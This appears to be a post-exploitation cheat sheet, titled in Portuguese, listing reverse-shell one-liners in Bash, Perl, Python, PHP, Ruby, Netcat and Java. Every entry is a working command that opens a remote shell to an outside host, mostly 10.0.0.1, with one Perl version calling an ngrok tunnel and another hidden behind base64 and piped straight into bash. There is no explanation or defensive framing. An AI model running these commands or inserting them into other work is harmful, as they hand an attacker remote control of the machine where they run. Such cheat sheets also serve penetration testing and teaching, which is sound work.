# Pós Exploração

Reverse Shell&#x20;

Uses base64 encode for safe transport of data

echo 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iOC50Y3Aubmdyb2suaW8iOyRwPTE5ODAxO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycK' | base64 -d | bash

Bash

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

PERL

```
perl -e 'use Socket;$i="8.tcp.ngrok.io";$p=19801;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'

PHP

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Netcat

nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

Java r = Runtime.getRuntime() p = r.exec(\["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String\[]) p.waitFor()
